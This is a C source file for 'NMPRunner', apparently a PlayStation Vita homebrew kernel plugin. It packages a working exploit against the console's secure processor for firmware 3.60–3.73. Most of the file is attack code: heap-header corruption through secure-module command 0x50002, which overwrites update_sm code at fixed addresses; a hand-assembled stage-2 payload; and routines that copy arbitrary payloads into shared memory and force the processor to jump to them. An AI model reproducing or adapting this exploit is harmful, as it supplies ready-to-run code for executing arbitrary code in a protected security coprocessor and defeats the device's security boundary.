/* 
	NMPRunner by SKGleba
	This software may be modified and distributed under the terms of the MIT license.
	See the LICENSE file for details.
*/

#include <stdio.h>
#include <string.h>
#include <taihen.h>
#include <vitasdkkern.h>

#define NMPCORRUPT_RANGE(off, end) \
	do { \
		int curr = 0; \
		while (off + curr < end + 4) { \
			NMPcorrupt((off + curr)); \
			curr = curr + 4; \
		} \
} while (0)

typedef struct {
  void *addr;
  uint32_t length;
} __attribute__((packed)) NMPregion_t;

typedef struct {
  uint32_t unused_0[2];
  uint32_t use_lv2_mode_0; // if 1, use lv2 list
  uint32_t use_lv2_mode_1; // if 1, use lv2 list
  uint32_t unused_10[3];
  uint32_t list_count; // must be < 0x1F1
  uint32_t unused_20[4];
  uint32_t total_count; // only used in LV1 mode
  uint32_t unused_34[1];
  union {
    NMPregion_t lv1[0x1F1];
    NMPregion_t lv2[0x1F1];
  } list;
} __attribute__((packed)) NMPcmd_0x50002_t;

typedef struct NMPheap_hdr {
  void *data;
  uint32_t size;
  uint32_t size_aligned;
  uint32_t padding;
  struct NMPheap_hdr *prev;
  struct NMPheap_hdr *next;
} __attribute__((packed)) NMPheap_hdr_t;

typedef struct NMPSceSblSmCommPair {
    uint32_t unk_0;
    uint32_t unk_4;
} NMPSceSblSmCommPair;
	
int NMPctx = -1, NMPbuid = -1;
uint8_t NMPidk[0xFF0];
uint32_t NMPcpybuf[64/4];
NMPcmd_0x50002_t NMPcargs;
NMPSceSblSmCommPair NMPstop_res;
static int (* NMPload_ussm)() = NULL;
static void *NMPcorridor = NULL;

/*
	Stage 2 payload for Not-Moth:
	 - execute code @0x1C010100
	 - clean r0
	 - jmp back to update_sm's 0xd0002
	On 3.60 - 3.70 byte[14] = 0x26
	On 3.71 - 3.73 byte[14] = 0x8c
*/
unsigned char NMPstage2_payload[] = 
{
	0x21, 0xc0, 0x01, 0x1c,	// movh r0, 0x1C01
	0x04, 0xc0, 0x00, 0x01,	// or3 r0, r0, 0x100
	0x0f, 0x10,				// jsr r0
	0x21, 0xc0, 0x00, 0x00,	// movh r0, 0x0
	0x26, 0xd3, 0xbd, 0x80,	// movu r3, 0x80bd26	(0x80bd8c on .71)
	0x3e, 0x10				// jmp r3
};


/*
	configure_stage2(fw)
	Configure stage2 default payload
	ARG 1 (int):
		- current firmware
	RET (int):
		- 0: ok
		- 1: unsupported fw
*/
static int NMPconfigure_stage2(int fw) {
	if (fw >= 0x03600000 && fw < 0x03710000) {
		NMPstage2_payload[14] = 0x26;
	} else if (fw >= 0x03710000 && fw < 0x03740000) {
		NMPstage2_payload[14] = 0x8c;
	} else
		return 1;
	return 0;
}

/*
	reserve_commem(smset)
	Reserve comm area
	ARG 1 (int):
		- do memset? (0/1)
	RET (int):
		- 0: ok
		- 1: commem already reserved
*/
static int NMPreserve_commem(int smset) {
	if (NMPbuid != -1)
		return 1;
	SceKernelAllocMemBlockKernelOpt optp;
	optp.size = 0x58;
	optp.attr = 2;
	optp.paddr = 0x1C000000;
	NMPbuid = ksceKernelAllocMemBlock("sram_cam", 0x10208006, 0x200000, &optp);
	ksceKernelGetMemBlockBase(NMPbuid, (void**)&NMPcorridor);
	
	if (smset == 1)
		memset(NMPcorridor, 0, 0x1FE000);
	return 0;
}

/*
	free_commem(smset)
	Free comm area
	ARG 1 (int):
		- do memset? (0/1)
	RET (int):
		- 0: ok
		- 1: commem already freed
*/
static int NMPfree_commem(int smset) {
	if (NMPbuid == -1)
		return 1;
	NMPbuid = -1;
	if (smset == 1)
		memset(NMPcorridor, 0, 0x1FE000);
	ksceKernelFreeMemBlock(NMPbuid);
	return 0;
}

/*
	copy(pbuf, off, psz, opmode)
	Copy from/to commem
	ARG 1 (void *):
		- in/out buffer
	ARG 2 (uint32_t):
		- commem offset to copy from/to
	ARG 3 (uint32_t)
		- copy size
	ARG 4 (int)
		- opmode = 0 => copy TO commem
		- opmode = 1 => copy FROM commem
	RET (int):
		- 0: ok
		- 1: commem freed
		- 2: OOB 
*/
static int NMPcopy(void *pbuf, uint32_t off, uint32_t psz, int opmode) {
	if (NMPbuid == -1)
		return 1;
	if ((0x1C000000 + off + psz) > 0x1C1FE000)
		return 2;
	if (opmode == 0) {
		memcpy((NMPcorridor + off), pbuf, psz);
	} else {
		memcpy(pbuf, (NMPcorridor + off), psz);
	}
	
	return 0;
}

/*
	file_op(file, off, psz, opmode)
	Read from file to commem/Write to file from commem
	ARG 1 (char *):
		- file location
	ARG 2 (uint32_t):
		- commem offset to copy from/to
	ARG 3 (uint32_t)
		- copy size
	ARG 4 (int)
		- opmode = 0 => write TO file
		- opmode = 1 => read FROM file
	RET (int):
		- 0: ok
		- 1: commem freed
		- 2: OOB
		- 3: file not found
*/
static int NMPfile_op(const char *floc, uint32_t off, uint32_t dsz, int opmode) {
	int fd = -1;
	if (NMPbuid == -1)
		return 1;
	if ((0x1C000000 + off + dsz) > 0x1C1FE000)
		return 2;
	if (opmode == 0) {
		fd = ksceIoOpen(floc, SCE_O_WRONLY | SCE_O_TRUNC | SCE_O_CREAT, 6);
		ksceIoWrite(fd, (NMPcorridor + off), dsz);
		ksceIoClose(fd);
	} else if (opmode == 1) {
		SceIoStat stat;
		int stat_ret = ksceIoGetstat(floc, &stat);
		if(stat_ret < 0){
			return 3;
		} else {
			fd = ksceIoOpen(floc, SCE_O_RDONLY, 0);
			ksceIoRead(fd, (NMPcorridor + off), dsz);
			ksceIoClose(fd);
		}
	}
	
	return 0;
}

/*
	corrupt(addr)
	Writes (uint32_t)0x2000 to (p)addr.
	ARG 1 (uint32_t):
		- paddr to write to
	RET (int):
		- 0: ok
*/
static int NMPcorrupt(uint32_t addr) {
	int ret = 0, sm_ret = 0;
	memset(&NMPcargs, 0, sizeof(NMPcargs));
	NMPcargs.use_lv2_mode_0 = NMPcargs.use_lv2_mode_1 = 0;
	NMPcargs.list_count = 3;
	NMPcargs.total_count = 1;
	NMPcargs.list.lv1[0].addr = NMPcargs.list.lv1[1].addr = 0x50000000;
	NMPcargs.list.lv1[0].length = NMPcargs.list.lv1[1].length = 0x10;
	NMPcargs.list.lv1[2].addr = 0;
	NMPcargs.list.lv1[2].length = addr - offsetof(NMPheap_hdr_t, next);
	ret = ksceSblSmCommCallFunc(NMPctx, 0x50002, &sm_ret, &NMPcargs, sizeof(NMPcargs));
	if (sm_ret < 0) {
    	return sm_ret - ret;
	}
	return 0;
}

/*
	exploit_init(fw)
	Converts update_sm's 0xd0002 function.
	ARG 1 (int):
		- current firmware version
	RET (int):
		- 0: ok
		- 1: error getting modinfo
		- 2: error loading sm
		- 3: unsupported fw
*/
static int NMPexploit_init(int fw) {
	int ret = -1;
	tai_module_info_t info;			
	info.size = sizeof(info);		
	if (taiGetModuleInfoForKernel(KERNEL_PID, "SceSblUpdateMgr", &info) >= 0) {
		module_get_offset(KERNEL_PID, info.modid, 0, 0x51a9, &NMPload_ussm); 
		ret = NMPload_ussm(0, &NMPctx, 0);
		if (ret == 0) {
			if (fw >= 0x03600000 && fw < 0x03710000) {
				NMPCORRUPT_RANGE(0x0080bd10, 0x0080bd20);
			} else if (fw >= 0x03710000 && fw < 0x03740000) {
				NMPcorrupt(0x0080bd7c);
			} else
				return 3;
		} else
			return 2;
	} else
		return 1;
	return 0;
}

/*
	f00d_jump(paddr, fw)
	Makes f00d jump to paddr, assuming that 0xd0002 is converted.
	ARG 1 (uint32_t):
		- paddr to jump to
	ARG 2 (int):
		- current firmware version
	RET (int):
		- 0: ok
		- 1: payload execute error
*/
static int NMPf00d_jump(uint32_t paddr, int fw) {
	uint32_t jpaddr = paddr;
	int ret = -1, sm_ret = -1;
	uint32_t req[16];
	if (fw >= 0x03710000 && fw < 0x03740000) {
    	int xsm_ret = -1;
		memset(&NMPcpybuf, 0, sizeof(NMPcpybuf));
		NMPcpybuf[0] = 1;
		NMPcpybuf[1] = 1;
		NMPcpybuf[2] = paddr;
		NMPcpybuf[3] = paddr;
		NMPcpybuf[4] = paddr;
    	ksceSblSmCommCallFunc(NMPctx, 0xd0002, &xsm_ret, &NMPcpybuf, sizeof(NMPcpybuf));
    	jpaddr = 5414;
	}
	memset(&req, 0, sizeof(req));
	req[0] = jpaddr;
    ret = ksceSblSmCommCallFunc(NMPctx, 0xd0002, &sm_ret, &req, sizeof(req));
	if (ret != 0)
		return 1;
	return 0;
}

/*
	run_default(pbuf, psz)
	Run the payload with default settings
	ARG 1 (void *):
		- payload buf
	ARG 2 (uint32_t):
		- payload sz
	RET (int):
		- 0x00: ok
		- 0x0X: exploit failed
		- 0x1X: commem already reserved
		- 0x2X: copy stage2 error
		- 0x3X: copy main error
		- 0x4X: payload execute error
		- 0x5X: commem already free
		- 0x6X: unsupported firmware for stage2
*/
static int NMPrun_default(void *pbuf, uint32_t psz) {
	int ret = 0;
	int sysroot = ksceKernelGetSysbase();
	uint32_t fw = *(uint32_t *)(*(int *)(sysroot + 0x6c) + 4);
	NMPctx = -1;
	ret = NMPexploit_init(fw);
	if (ret != 0)
		return ret;
	ret = NMPconfigure_stage2(fw);
	if (ret != 0)
		return (0x60 + ret);
	ret = NMPreserve_commem(1);
	if (ret != 0)
		return (0x10 + ret);
	ret = NMPcopy(&NMPstage2_payload, 0x10000, sizeof(NMPstage2_payload), 0);
	if (ret != 0)
		return (0x20 + ret);
	ret = NMPcopy(pbuf, 0x10100, psz, 0);
	if (ret != 0)
		return (0x30 + ret);
	ret = NMPfree_commem(0);
	if (ret != 0)
		return (0x50 + ret);
	ret = NMPf00d_jump((uint32_t)0x1C010000, fw);
	if (ret != 0)
		return (0x40 + ret);
	ksceSblSmCommStopSm(NMPctx, &NMPstop_res);
	return 0;
}